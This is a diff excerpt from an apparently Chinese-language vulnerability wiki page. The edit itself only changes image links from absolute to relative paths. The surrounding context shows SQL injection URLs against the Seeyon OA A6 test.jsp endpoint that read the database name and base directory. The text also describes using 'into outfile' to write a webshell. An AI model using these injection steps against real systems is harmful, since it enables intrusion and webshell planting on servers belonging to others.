@@ -22,7 +22,7 @@
 
     http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())
 
-![](/Users/aresx/Documents/VulWiki/.resource/致远OAA6test.jspsql注入漏洞/media/rId24.png)
+![](./.resource/致远OAA6test.jspsql注入漏洞/media/rId24.png)
 
 Mysql注入中，我们使用into outfile
 来写入数据，用此方法注入webshell，前提条件两个：
@@ -35,7 +35,7 @@ Mysql注入中，我们使用into outfile
 
     http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)
 
-![](/Users/aresx/Documents/VulWiki/.resource/致远OAA6test.jspsql注入漏洞/media/rId25.png)
+![](./.resource/致远OAA6test.jspsql注入漏洞/media/rId25.png)
 
 通过yyoa目录结构猜测物理路径为
 
